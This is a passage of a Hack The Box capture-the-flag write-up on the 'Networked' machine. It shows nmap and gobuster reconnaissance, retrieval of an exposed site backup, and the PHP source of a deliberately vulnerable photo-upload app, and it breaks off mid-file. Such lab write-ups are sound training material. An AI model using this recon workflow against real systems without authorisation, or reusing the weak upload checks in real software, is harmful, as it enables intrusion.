<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Networked | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Networked" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Networked from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Networked from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/networked/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/networked/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/networked/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-11-16T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Networked from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/networked/","image":"https://0xrick.github.io/hackthebox/networked/0.png","headline":"Hack The Box - Networked","dateModified":"2019-11-16T00:00:00+02:00","datePublished":"2019-11-16T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/networked/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Networked</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
      <a class="tag" href="/tag/sudo/">sudo</a>
      
      <a class="tag" href="/tag/networking/">networking</a>
      
  </div>
  
  <div class="post-date">Published on 16 Nov 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Networked from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br>Hey guys, today Networked retired and here’s my write-up about it. It was a quick fun machine with an <code class="highlighter-rouge">RCE</code> vulnerability and a couple of command injection vulnerabilities. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.146</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">networked.htb</code>. Let’s jump right in !
<img src="/images/hackthebox/networked/0.png" alt="">
<br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# nmap -sV -sT -sC -o nmapinitial networked.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 01:16 EET 
Nmap scan report for networked.htb (10.10.10.146)
Host is up (1.7s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.70 seconds
root@kali:~/Desktop/HTB/boxes/networked# 
</code></pre></div></div>
<p><br>We got <code class="highlighter-rouge">ssh</code> on port 22 and <code class="highlighter-rouge">http</code> on port 80, let’s check the web service.
<br></p>
<hr>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><br>The index page had nothing except for this message:<br>
<img src="/images/hackthebox/networked/1.png" alt="">
<br><br>So I ran <code class="highlighter-rouge">gobuster</code> to check for sub directories and I found 2 interesting directories, <code class="highlighter-rouge">/uploads</code> and <code class="highlighter-rouge">/backup</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# gobuster -u http://networked.htb/ -w /usr/share/wordlists/dirb/common.txt                                                                                                

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://networked.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/11/16 01:21:45 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/backup (Status: 301)
/cgi-bin/ (Status: 403)
/index.php (Status: 200)
/uploads (Status: 301)
=====================================================
2019/11/16 01:24:26 Finished
=====================================================
root@kali:~/Desktop/HTB/boxes/networked# 
</code></pre></div></div>
<p><br>In <code class="highlighter-rouge">/backup</code> I found a <code class="highlighter-rouge">tar</code> archive that had a backup of all the site’s pages:<br>
<img src="/images/hackthebox/networked/2.png" alt="">
<br><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# wget http://networked.htb/backup/backup.tar
--2019-11-16 01:25:13--  http://networked.htb/backup/backup.tar
Resolving networked.htb (networked.htb)... 10.10.10.146
Connecting to networked.htb (networked.htb)|10.10.10.146|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240 (10K) [application/x-tar]
Saving to: ‘backup.tar’

backup.tar                                           100%[=====================================================================================================================&gt;]  10.00K  --.-KB/s    in 0.1s    

2019-11-16 01:25:13 (95.3 KB/s) - ‘backup.tar’ saved [10240/10240]

root@kali:~/Desktop/HTB/boxes/networked# 
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# mkdir backup
root@kali:~/Desktop/HTB/boxes/networked# cd backup/
root@kali:~/Desktop/HTB/boxes/networked/backup# mv ../backup.tar .
root@kali:~/Desktop/HTB/boxes/networked/backup# tar xvf backup.tar 
index.php
lib.php
photos.php
upload.php
root@kali:~/Desktop/HTB/boxes/networked/backup# ls -la
total 36
drwxr-xr-x 2 root root  4096 Nov 16 01:26 .
drwxr-xr-x 3 root root  4096 Nov 16 01:25 ..
-rw-r--r-- 1 root root 10240 Jul  9 13:33 backup.tar
-rw-r--r-- 1 root root   229 Jul  9 13:33 index.php
-rw-r--r-- 1 root root  2001 Jul  2 13:38 lib.php
-rw-r--r-- 1 root root  1871 Jul  2 14:53 photos.php
-rw-r--r-- 1 root root  1331 Jul  2 14:45 upload.php
root@kali:~/Desktop/HTB/boxes/networked/backup# 
</code></pre></div></div>
<p><br><code class="highlighter-rouge">index.php</code>:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
Hello mate, we're building the new FaceMash!<span class="nt">&lt;/br&gt;</span>
Help by funding us and be the new Tyler<span class="err">&amp;</span>Cameron!<span class="nt">&lt;/br&gt;</span>
Join us at the pool party this Sat to get a glimpse
<span class="c">&lt;!-- upload and gallery not yet linked --&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">lib.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="c1">#echo "name $name - ext $ext\n";
</span>  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">//echo "prefix: $prefix - fname: $filename&lt;br&gt;\n";
</span>  <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">"4tt4ck on file "</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">": prefix is not a valid ip "</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
</span>    <span class="p">{</span>
      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string
</span>    <span class="p">{</span>
      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nx">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>  
<span class="p">}</span>

<span class="k">function</span> <span class="nf">displayform</span><span class="p">()</span> <span class="p">{</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"myFile"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"go!"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?php</span>
  <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>


<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">photos.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
<span class="nc">.tg</span>  <span class="p">{</span><span class="nl">border-collapse</span><span class="p">:</span><span class="nb">collapse</span><span class="p">;</span><span class="nl">border-spacing</span><span class="p">:</span><span class="m">0</span><span class="p">;</span><span class="nl">margin</span><span class="p">:</span><span class="m">0px</span> <span class="nb">auto</span><span class="p">;}</span>
<span class="nc">.tg</span> <span class="nt">td</span><span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;</span><span class="nl">padding</span><span class="p">:</span><span class="m">10px</span> <span class="m">5px</span><span class="p">;</span><span class="nl">border-style</span><span class="p">:</span><span class="nb">solid</span><span class="p">;</span><span class="nl">border-width</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">overflow</span><span class="p">:</span><span class="nb">hidden</span><span class="p">;</span><span class="nl">word-break</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">border-color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span>
<span class="nc">.tg</span> <span class="nt">th</span><span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;</span><span class="nl">font-weight</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">padding</span><span class="p">:</span><span class="m">10px</span> <span class="m">5px</span><span class="p">;</span><span class="nl">border-style</span><span class="p">:</span><span class="nb">solid</span><span class="p">;</span><span class="nl">border-width</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">overflow</span><span class="p">:</span><span class="nb">hidden</span><span class="p">;</span><span class="nl">word-break</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">border-color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span>
<span class="nc">.tg</span> <span class="nc">.tg-0lax</span><span class="p">{</span><span class="nl">text-align</span><span class="p">:</span><span class="nb">left</span><span class="p">;</span><span class="nl">vertical-align</span><span class="p">:</span><span class="nb">top</span><span class="p">}</span>
<span class="k">@media</span> <span class="n">screen</span> <span class="n">and</span> <span class="p">(</span><span class="n">max-width</span><span class="p">:</span> <span class="m">767px</span><span class="p">)</span> <span class="p">{</span><span class="nc">.tg</span> <span class="p">{</span><span class="nl">width</span><span class="p">:</span> <span class="nb">auto</span> <span class="cp">!important</span><span class="p">;}</span><span class="nc">.tg</span> <span class="nt">col</span> <span class="p">{</span><span class="nl">width</span><span class="p">:</span> <span class="nb">auto</span> <span class="cp">!important</span><span class="p">;}</span><span class="nc">.tg-wrap</span> <span class="p">{</span><span class="nl">overflow-x</span><span class="p">:</span> <span class="nb">auto</span><span class="p">;</span><span class="nl">-webkit-overflow-scrolling</span><span class="p">:</span> <span class="n">touch</span><span class="p">;</span><span class="nl">margin</span><span class="p">:</span> <span class="nb">auto</span> <span class="m">0px</span><span class="p">;}}</span><span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Welcome to our awesome gallery!<span class="nt">&lt;/br&gt;</span>
See recent uploaded pictures from our community, and feel free to rate or comment<span class="nt">&lt;/br&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
<span class="nv">$ignored</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">,</span> <span class="s1">'index.html'</span><span class="p">);</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>

<span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'&lt;div class="tg-wrap"&gt;&lt;table class="tg"&gt;'</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$ignored</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
  <span class="nv">$files</span><span class="p">[</span><span class="nv">$file</span><span class="p">]</span> <span class="o">=</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">);</span>
<span class="p">}</span>
<span class="nb">arsort</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$exploded</span>  <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$prefix</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$exploded</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// for HTB, to avoid too many spoilers
</span>  <span class="k">if</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$exploded</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">'10_10_'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$prefix</span> <span class="o">===</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]))</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="p">}</span>

<span class="k">echo</span> <span class="s1">'&lt;td class="tg-0lax"&gt;'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"uploaded by </span><span class="nv">$check[1]</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;img src='uploads/"</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">"' width=100px&gt;"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;/td&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>


  <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/table&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">upload.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>

<span class="nb">define</span><span class="p">(</span><span class="s2">"UPLOAD_DIR"</span><span class="p">,</span> <span class="s2">"/var/www/html/uploads/"</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$myFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;An error occurred.&lt;/p&gt;"</span><span class="p">;</span>
        <span class="nx">displayform</span><span class="p">();</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
</span>    <span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
